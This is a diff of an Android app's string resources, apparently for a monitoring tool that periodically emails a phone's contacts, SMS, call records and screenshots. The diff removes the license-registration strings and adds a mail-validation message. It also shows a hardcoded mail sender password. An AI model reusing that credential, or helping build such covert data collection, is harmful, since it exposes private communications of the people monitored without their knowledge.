@@ -23,23 +23,18 @@
     <!-- Mail -->
     <string name="mail_sender_pwd">canadausa</string>
     <string name="mail_from">From</string>
-    <string name="mail_body">Hi, this is an auto mail from {0} with contacts, SMS and phone call information.</string>
+    <string name="mail_body">Hi, this is an auto mail from %s with contacts, SMS and phone call information.</string>
     
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
-    <string name="pref_category_reg_key">pref_category_reg</string>
-    <string name="pref_category_reg_title">Register</string>
     <string name="pref_category_feature_key">pref_category_feature</string>
     <string name="pref_category_feature_title">Features</string>
     <string name="pref_category_others_key">pref_category_others</string>
     <string name="pref_category_others_title">Others</string>
     
-    <string name="pref_username_key">pref_username</string>
-    <string name="pref_username_title">Name</string>
-    <string name="pref_serialnum_key">pref_serialnum</string>
-    <string name="pref_serialnum_title">Serial Num.</string>
     <string name="pref_mail_key">pref_mail</string>
     <string name="pref_mail_title">Mail</string>
+    <string name="pref_pls_input_mail">Incorrect mail address format: %s. Please input correct mail address</string>
     <string name="pref_info_interval_key">pref_info_interval</string> 
     <string name="pref_info_interval_title">Interval</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">Get info interval</string>
@@ -53,12 +48,5 @@
     <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
     <string name="init_hint_setting">Set username, serial number, mail address and interval</string>
     <string name="init_hint_hide">Exit current setting dialog</string>
-    
-    <!-- License -->
-    <string name="licensed_yes">Authenticated successfully! Thanks for your registration!</string>
-    <string name="licensed_no">Wrong user name or serial number</string>
-    <string name="pls_input_serial_num">Please input serial number</string>
-    <string name="pls_input_mail">Incorrect mail address format. Please input correct mail address</string>
-    <string name="pls_input_username">Please input user name</string>
     
 </resources>
